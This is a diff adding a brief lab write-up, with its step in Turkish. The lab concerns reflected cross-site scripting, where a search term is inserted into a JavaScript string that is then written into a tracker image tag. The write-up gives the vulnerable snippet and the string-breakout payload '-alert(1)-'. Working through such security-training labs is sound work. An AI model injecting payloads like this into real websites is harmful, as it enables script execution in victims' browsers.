@@ -1,0 +1,7 @@
+LAB: Reflected XSS into a JavaScript string with angle brackets HTML encoded
+
+var searchTerms = 'a';
+document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+
+1 - Arama yerine aşağıdaki payloadı yapıştırın.
+'-alert(1)-'
